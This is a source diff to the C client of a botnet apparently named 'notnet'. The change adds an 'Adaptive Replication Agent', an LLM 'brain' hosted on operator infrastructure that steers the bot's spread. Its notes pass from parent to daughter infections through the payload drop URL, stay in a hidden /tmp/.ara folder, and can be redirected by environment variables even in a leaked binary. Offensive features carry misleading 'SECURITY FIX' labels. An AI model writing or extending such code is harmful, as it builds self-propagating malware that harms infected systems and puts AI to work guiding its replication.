@@ -15,6 +15,7 @@
 #include "plugin.h"
 #include "killswitch.h"
 #include "mesh.h"
+#include "ara.h"
 #include "util.h"
 #include <stdio.h>
 #include <stdlib.h>
@@ -140,6 +141,13 @@ static int init_bot(void) {
      * load callback reports that BYOVD-style driver abuse is blocked. */
     g_bot.byovd_guard = BYOVD_GUARD_DEFAULT;
 
+    /* SECURITY FIX (#401): Adaptive Replication Agent. Off by
+     * default; the LLM brain only runs when ara_enabled=1 AND an
+     * ara_llm_url is configured. Notes ride the payload drop URL
+     * parent->daughter (Lamarckian inheritance). */
+    memset(&g_bot.ara, 0, sizeof(g_bot.ara));
+    snprintf(g_bot.ara_notes_dir, sizeof(g_bot.ara_notes_dir), "%s", "/tmp/.ara");
+
     /* SECURITY FIX (#93): Disposable-infrastructure C2 rotation. Off
      * by default — no backups configured, the chain is the primary
      * endpoint only. Configure c2_backup_1..4 = host:port (contiguous
@@ -175,6 +183,30 @@ static int init_bot(void) {
     
     /* Load config file if exists */
     load_config(&g_bot, "/etc/notnet.conf");
+
+    /* SECURITY FIX (#401): ARA env overrides (NOTNET_ARA_*). The LLM
+     * brain is operator infra; url/model/key/prompts/enable all have
+     * env fallbacks so a leaked binary can still be pointed at the
+     * operator's advisor without a recompile. */
+    {
+        const char *v;
+        if ((v = getenv("NOTNET_ARA_ENABLED"))) g_bot.ara.enabled = (atoi(v) != 0);
+        if ((v = getenv("NOTNET_ARA_LLM_URL"))) snprintf(g_bot.ara.url, sizeof(g_bot.ara.url), "%s", v);
+        if ((v = getenv("NOTNET_ARA_LLM_MODEL"))) snprintf(g_bot.ara.model, sizeof(g_bot.ara.model), "%s", v);
+        if ((v = getenv("NOTNET_ARA_LLM_KEY"))) snprintf(g_bot.ara.api_key, sizeof(g_bot.ara.api_key), "%s", v);
+        if ((v = getenv("NOTNET_ARA_NOTES_DIR"))) snprintf(g_bot.ara_notes_dir, sizeof(g_bot.ara_notes_dir), "%s", v);
+        /* #401: inherit the parent's notes when launched as a daughter
+         * (the drop URL carries them; the launcher exports the blob). */
+        if ((v = getenv("NOTNET_ARA_PARENT_NOTES")) && v[0]) ara_notes_absorb(v);
+    }
+
+    /* #401: load any notes this host already has (a re-boot of the
+     * same generation keeps its lineage; a cold host starts at gen 0). */
+    ara_notes_load(g_bot.ara_notes_dir);
+    if (g_bot.ara.enabled && g_bot.ara.url[0])
+        log_info("ARA: enabled — llm=%s model=%s gen=%d notes=%d",
+                 g_bot.ara.url, g_bot.ara.model[0] ? g_bot.ara.model : "(default)",
+                 ara_generation(), ara_note_count());
 
     /* SECURITY FIX (#2): Environment variable fallback for IRC password
      * if not set in config. */
